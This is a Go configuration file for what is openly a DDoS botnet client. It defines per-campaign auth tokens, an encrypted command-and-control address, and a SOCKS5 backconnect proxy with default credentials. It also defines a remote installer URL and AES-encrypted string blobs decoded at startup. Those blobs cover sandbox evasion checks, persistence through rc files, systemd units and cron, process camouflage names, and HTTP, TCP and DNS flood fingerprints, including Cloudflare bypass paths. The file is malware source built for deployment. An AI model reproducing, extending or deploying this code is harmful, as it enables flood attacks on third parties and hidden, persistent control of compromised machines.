package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "5146ce44" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "aq7j6KK4O&iUoYTk" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V4_3" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the SOCKS5 proxy interface.
// Default credentials are baked in at build time by setup.py.
// Can be overridden at runtime via !socksauth command.
// Protected by socksCredsMutex for concurrent read/write safety.
var proxyUser = "vision"    //change me run setup.py
var proxyPass = "vision"    //change me run setup.py

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// relayEndpoints holds pre-configured relay addresses for backconnect SOCKS5.
// Format: "host:port" — bots connect OUT to these relays.
// Leave empty to require explicit relay address via !socks command.
var relayEndpoints []string

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("bacb8dba51fd1102a25cbdce1e5babf779012b7937e85adb4582a2802804135ec72225fdc379edb646a9a818") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("a12914e5ffea7cacbc628a848b7df3d9f97e2cb123ef54fe5a4648909a70b5781bb65bd628bd6b41e3bd73233ec101fba7847833ac537afdf2888034a4337ab7835852639887af69e17467a79291658744213a67fcd31aa092cd0ef221a3ae54273fa26c489aa8c4224757dadc3d95df3c332afd3d")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("15cae8e1df82a6c77b8db4a5452d63e6e2249eb0439c9fb6e4fd5c9c0c2a68c277e105742546b019bed266206be75fb207ea250328d1869bea9708ee0ca7a6407f2b7bd93747d23ab453")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("fc20339d802a1e8df304137fc33dfebaa6f0961a46ed9a60a2fa6efae84d286b")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("8a4ca8578c4a25ce6c5b7505b021fd2c482f3566d5ded85fe9fb868409")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("70ef7511521a93d046cd2a7910621398475d5c8d28fdb62a1a804f81065c5a2688f390cd07")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("77014e1523f6a944137150fdd17ff3a88a6baaeeb23869e2e9b26309d8b44a")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("6e6ea706f1fec9a5759d68568f9a1378ac0b976f3323bc927fa4a0e2a9")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("f640a2f7d76e20c12323db7fea5896c9fac995f3e6a4ff48bc86f30d4dbc56fbf71cdbbd3efc753cc73c734d8e66014daa1bc9b68837b8")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("65c95b2478059c1fc145d03b2901ab3f544877024319541d11b2fbf983186a3498faf4")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("c90b51f15195f5cf7a3b12fd321f7bed2b5878cfb616b9bdc847d513fe265b4d93a5eed72cab569487516fabe58fd303b88a1cbeb35901d2f3ab37b7bd43ea8cc0b2afca56ba9cf3728362e9d1ed9b7c3d6106327786cb6450f48f12a6facfbc1c0520dc3561aaa4150d4e494ec5824dd78b0d9483646839bef9d308b295feec2c507b9c8ef71894baf581bed29e70006af41479cecb14c8423bf52b8ca12616db6b55f7ac9292bc01791303ed8df4c7dafba52c35f3f8e6bdff964e5d115c3611f3151cb301e7e74cfa290343d1d4")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("05ef7dfcd56286399d70375af44826317e6f8c6ce5599aa74c9d13d33b37276bb134d60b86d4e2e1036eed07a96266c049f25c9d7b7cbb4728753c89b70cc2cc9376f5cbe41a353ff6eea63f64248f7b5c58073ebe934f06219a4f219a2ccd5458453ec31889c9043291aa8c2fce1e23162ddc2f24b63db95b5a9af79e36719a570321b9e0d0f38c10077ee36cf91b2f85fa25dbe7d5542441891822074ca59ce998af739864eec9b8211dc6acae4a58a2ef84f64effa40390bbe7d1d658254d84c43357da49")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("4ba5e9c07afe3126916bacaddf2be8e84286159e97ea698dfd")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("11830a5525c8a610ce6d7f54a8f686c39b331cbe3bf82c58f9d3e3ada2")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("a686c0adab927cbe20494d6412c2e4fed8f38a00880d67a7b289cd45bc599cbdc70dae6fd90e41")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("8e2dde82c0fff5d34e874bebf632832cfe37ffbaaa9b858ea580c060b8968271cce311d945bcc69f3c2d39")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("0bb35dcbdd76c7aefd049313b82d1b71cb73fa314508d8ff642e26de7422b1")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("7064bee29d6b07cbcf2f9aba6bd05aa8a403ebd412415e631aa9292e")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("912f490013d041f22072c3f3a7826d4dacccbf135677151c0850be2a6beeaea256063ed05a54786e719e3674a0856c68")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("d208049fc50e9e468cdef8c4cae7d3f5323e554b")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("6ae1f4eb56b2559fb04fe7bcf8484ab682e38a2672")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("0bcc2ef9077ff6132f9a4f2e6262c5e715b16d68db1120f49c6c12a7939554")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("af5f859d44fbf6bf86983429cea73057b449ea4792419e0aa40a")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("73649b2b1af44060fb8a231d3d3dd5d220f3873de4739b6f4ceba1")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("7262b8fb081e0b9c473dba0aa7e43c75607d843561aa6b82cab8e6")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("0b79b5fde3d41b172c61e88e308f2e5a0e606ce263fbcffcb68afca74ecbbd")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("63bf8a9bad9cc367503f6696987ad0ad30dafef3e32c0385c4a38dc27500422567312bb136299b0d7dda17def59c0b29a5247b7bc6")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("0732c58ebd2c2aade9bfe7340166699055974201c53c144d73")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("09b268277f0802ba0a9d900f8a825c26cdf5402a4758e0b202ba25368ae246b5f49e")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("e1d0339b1919a90efde0dd7252212ba30f782ab7530dbd13012d31aa78f49b7ed9a05409df83a827fc540baac1c9")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("29eef8ffe775830506435ed1b0497d613b867ea23c514234a39ccc8bfb9954ed84ebf63cc9a59a16e570de60")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("428f9996a0d8ca5baeea72e6e55607e88df7e948f7d1770ae4f5afd4ec335e7e108a30398e3576ca110ef6eb5f8bd039ef125479cf8f9602bd0d")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("fe9624c29519f30fa72b56692c677c13a21aff6a36212f51491f940421c61665")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("3333e04b8425a69e66fdb975e859bb51be109c86330745a7990e65771c6add9e5ac8b64106fa89ed7a9103d93becfbb1")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("14aab83cb2aa33e367780267dd829176365258da571d0da4c39687949d3eedc046905b83cc")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("5070693c8cf047e6ca3114533f4907752602bd534df82789b698c5b508bafdb939d89547e0650bb4ba9cead8974553")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("585f719169fc50156f8b1313618e6a524d5ff5bdd42855d93cd30cd6592e4d6ad18a7329513733c8ba0675bd44204bb9e958c011172f11569dca821ae20aa203ff2108e0992e788892379b07eb2ec03dd0f56eee049e4bdd471246b37bcfb4cbbf78cb10c453f4468841a2955c94bf5a60")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("fdaf29887588e314393657c39d3a7e325760f233e1cea91f842cb8be59880548ecd602f9bc7e9ed49b36f6994c40fff2235c7d4492db78d7c9f29300f83f40e08ca1b181f814d30a27aad665585731d60c")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("6374c5e7443719dfaab75c3db2fd6ca624b6590913c3aeea2d50352f157f16d6ddf7d2f219770829addddf6dc7b9cf6682722ffde4661e6d5fa305963841d1948f7ea2551e97d18bb1879b88b4fe")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("74f5b0ab3a80dd15f4cbd3ceba0f234ad06947804aa403183c341ed0c6f2bc6ed616bb590e12be6ead433814b087d1c1b37f8c9e201736b614bcfee530051fafd2a3e2010bebc7bbcaafe0de1e")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("ba515530625a14f8ab36de85894f8462ed2b9fa4bbdc6256eb7e8b2c17455d4bf6703026cd6a989854d654aec45d5509558e09141719089dd07221c180dbdf")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("48810d40f3e6ba488a887e4229daabe2a4972f5014c15060e93e84659e5fd0b149911222")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("09fcfa2d61a315471e2fc778938ea11443301716d3edc1cf4ce599e211eb3bb0a93d917b80c7ac954434acdbb6f9b4b2ffa92a4d2678e7c85607677297f507fa72d07ad0e5d53b245dfa14d488b5e9bf205b7bdda0624c71f24e9c7c0aa75600daa1a1145f913cc92ce51a08fab7947a945ede68b3d4cb47d895aa2c8a424400aa167861240251bb6e1d467863a3f5d3f68255a601009def7983d34acbb44021309f4ecaa8adcb8c8e65ca154ff66bc8a99c276e6d31b84aa645363d157c3452aa947514bc19fd89e9bea221b980dec43b54412574cf6ea514f8f76082")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("29ae226435347468dcf116effd400a20533a710e656833c7345fa39fcc9bbb635ab9871be4419682de4a547acfbe952390e3b7a3690edece9cc4be442fa655bbf7beaf7f20b4fd02053b02c81190f85764bf04b1fd89c2cd585175")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("c0d0a48097804145c93827563edda18046791dd7f331aee49db96224589ee0984a5ddd9aeafd3965f18aad803efc2bd6aef56cfc34ba3eb31434ff")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("ebc439dfa60ed3fb2c18de3c291d026435552f6144af904650fa5d6f93e4a3ed31789c298532171fee02a299476f895ab2805ed91c58035eae70f9ce0b8ffbdab8f55ba06b62161304")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("819cb1b73dcd72da1264336935bb26345c986c0489ef7c")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("f67f36d8dded5f21495fcf396b9ba836ce1ea5bfb9644735836606a1831678adda8d")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("be5a7df4b9c33a6d7d7e705713b614734e867022bb98299ef09c86ba1fc7b5ed2e3356d061dc3eefa9c04d699bf034f83c31218a19a7219a7d92802466e2cc333f04ffb166c4353411eaa3b24065f472315379344a40804c3f372616925143")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("cdd389ea20c14373642d865505fb34d5f589")

// @encrypt:slice relayEndpoints
var rawRelayEndpoints, _ = hex.DecodeString("") //change me run setup.py — empty = no pre-configured relays

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("96c38aaa0ecd801d24ea588af44f339c38db734d02b8cd8bf7d43d000e63184e6c39c860d3ce344936ac54de5da7bff79e32571dcf")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("4bbe6891b68ac7e6db83f77ef7a54a2585b4")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("ef01916131b55a620f872f42dd990720fb73")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("c62339d16390ca41c7b349aace9247d3f4e5c25071ee")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("183b1557c91e22d361a834d7d2411d716a88dae08a2e89db")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("dd2a48c62ee46556e7dd8519347cf230da97dd0832")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("cba39a4067b3e6ba82d2bfc8e332f88e0c02")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("9ec5211c34ec2fc440759321df526b44b2810dce4a429f670f")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("9c2f013149ca30f7c2933532349b75627897de8cd640140bb2")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("3e919eeeeefffd566df4079921a98213204c8ed03cd284")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("2452e45e9b6a94d535b3be75a0f1b858a43ee297")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// Relay endpoints (optional — empty blob means none configured)
	if len(rawRelayEndpoints) > 0 {
		relayEndpoints = strings.Split(string(garuda(rawRelayEndpoints)), "\x00")
	}

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
